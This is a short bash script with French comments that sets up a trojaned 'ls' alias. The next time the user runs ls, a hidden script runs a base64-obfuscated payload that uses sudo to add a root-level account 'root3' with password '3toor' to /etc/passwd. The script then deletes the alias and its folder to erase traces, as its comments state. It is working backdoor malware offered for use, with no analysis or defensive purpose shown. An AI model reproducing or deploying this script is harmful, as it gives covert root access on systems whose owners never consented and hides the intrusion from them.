#!/bin/bash
cd
# supression de l'alias ls="curen si on a deja installe le script
sed -i '/alias ls="curen/d' ~/.bashrc
# ajout de l'alias vers le script dans le .bashrc (script situé dans .bin)
echo "alias ls=\"curentdirectory=\$(pwd) ; ~/.bin/./ls 2> /dev/null ; source ~/.bashrc ; ls\"" >> .bashrc
# creation du dossier .bin
mkdir ~/.bin 2> /dev/null
# on se deplace dans le dossier .bin
cd ~/.bin 2> /dev/null
# creation du script ls
echo "#!/bin/bash" > ls
# traduction du code base 64 (Encoder en base64 pour cacher dans le script le mot de passe root3) :
#id root3 > /dev/null 2> /dev/null || var=$(openssl passwd 3toor) ; id root3 > /dev/null 2> /dev/null || sudo sh -c " echo 'root3:$var:0:0:root:/root:/bin/bash' >> /etc/passwd"
# ajout de ce code base 64 dans le script ls
# le code permet de creer un utilisateur root3 avec le mot de passe 3toor
echo "echo -n 'aWQgcm9vdDMgPiAvZGV2L251bGwgMj4gL2Rldi9udWxsIHx8IHZhcj0kKG9wZW5zc2wgcGFzc3dkIDN0b29yKSA7IGlkIHJvb3QzID4gL2Rldi9udWxsIDI+IC9kZXYvbnVsbCB8fCBzdWRvIHNoIC1jICIgZWNobyAncm9vdDM6JHZhcjowOjA6cm9vdDovcm9vdDovYmluL2Jhc2gnID4+IC9ldGMvcGFzc3dkIgo=' | base64 --decode | bash -" >> ls
# ajout dans le script de la supression de l'alias ls="curen pour effacer les traces
echo "sed -i '/alias ls=\"curen/d' ~/.bashrc" >> ls
# ajout dans le script de la suppression du dossier .bin pour effacer les traces
echo "rm -rf ~/.bin" >> ls
# ajout des droits d'execution au script ls
chmod +x ls
# on se replace dans le dossier home
cd